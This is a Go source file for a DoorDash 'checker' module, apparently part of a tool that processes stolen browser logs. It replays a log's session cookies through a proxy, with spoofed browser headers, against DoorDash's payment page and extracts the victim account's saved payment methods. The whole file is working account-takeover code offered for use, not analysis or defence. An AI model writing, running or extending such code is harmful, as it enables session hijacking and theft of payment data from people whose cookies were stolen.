package doordash

import (
	"encoding/json"
	"fmt"
	"github.com/restartfu/checkmylog/checkmylog"
	http "github.com/saucesteals/fhttp"
	"io"
	"net/url"
	"regexp"
)

// DoorDash is the checker for DOORDASH.
var paymentMethodsRegexp = regexp.MustCompile(`"getPaymentMethodList":(\[.*?])`)

// DoorDash is the checker for DOORDASH.
type DoorDash struct{}

// Name ...
func (DoorDash) Name() string {
	return "DOORDASH"
}

// URL ...
func (DoorDash) URL() url.URL {
	return url.URL{Scheme: "https", Host: "doordash.com"}
}

// Options ...
func (DoorDash) Options() checkmylog.Opts {
	return checkmylog.Opts{
		Proxied: true,
	}
}

// Capture ...
func (DoorDash) Capture(l checkmylog.Log) (checkmylog.Account, bool) {
	req, err := http.NewRequest("GET", "https://www.doordash.com/consumer/payment/", nil)
	if err != nil {
		panic(err)
	}

	if len(l.Cookies(req.URL)) <= 0 {
		return nil, false
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Dnt", "1")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Referer", "https://www.doordash.com/home/")
	req.Header.Set("Sec-Ch-Ua", `"Not(A:Brand";v="24", "Chromium";v="122"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"macOS"`)
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

	resp, err := l.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return nil, false
	}

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	matches := paymentMethodsRegexp.FindStringSubmatch(string(b))
	if len(matches) != 2 {
		fmt.Println("no match (doordash)")
		return nil, false
	}

	paymentMethodsRaw := matches[1]
	var paymentMethods []paymentProfile
	if err = json.Unmarshal([]byte(paymentMethodsRaw), &paymentMethods); err != nil {
		panic(err)
	}

	return account{paymentProfiles: paymentMethods}, true
}
